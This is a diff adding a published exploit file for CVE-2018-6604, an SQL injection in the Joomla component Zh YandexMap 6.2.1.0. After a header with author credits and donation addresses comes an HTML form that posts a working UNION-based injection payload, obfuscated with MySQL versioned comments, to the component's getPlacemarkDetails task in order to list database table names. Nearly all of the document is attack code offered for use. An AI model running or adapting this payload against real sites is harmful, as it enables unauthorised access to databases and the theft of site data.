@@ -1,0 +1,40 @@
+<!--
+# # # # #
+# Exploit Title: Joomla! Component Zh YandexMap 6.2.1.0 - SQL Injection
+# Dork: N/A
+# Date: 04.02.2018
+# Vendor Homepage: http://zhuk.cc/
+# Software Link: https://extensions.joomla.org/extensions/extension/maps-a-weather/maps-a-locations/zh-yandexmap/
+# Software Download: http://zhuk.cc/files/pkg_zhyandexmap-j30-6.2.1.0-final.zip
+# Version: 6.2.1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-6604
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# Want To Donate ?
+# BTC : 1NGEp2eNWRCE6gp2i31UPN6G6KBzMDdCyZ
+# ETH : 0xd606c6b86a1b88c7fcc1f58f7659cfd968449cf2
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# # # # #
+-->
+<html>
+<body>
+<!--com_zhyandexmap/controller.php-->
+
+<!--# 1)-->
+<!--L 29: public function getPlacemarkDetails() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhyandexmap&no_html=1&format=raw&task=getPlacemarkDetails" method="post">
+<input name="id" value="-11 UNION ALL SELECT 11,11,11,11,11,11,11,11,/*!01111CONCAT*/((/*!01111SELECT*/(@x)/*!01111FROM*/(/*!01111SELECT*/(@x:=0x00),(@NR:=0),(/*!01111SELECT*/(0)/*!01111FROM*/(INFORMATION_SCHEMA.TABLES)/*!01111WHERE*/(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)/*!01111AND*/(0x00)IN(@x:=/*!01111CONCAT*/(@x,/*!01111LPAD*/(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11--" type="hidden">
+<input type="submit" value="1-Ver Ayari">
+</form>
+
+</body>
+</html>
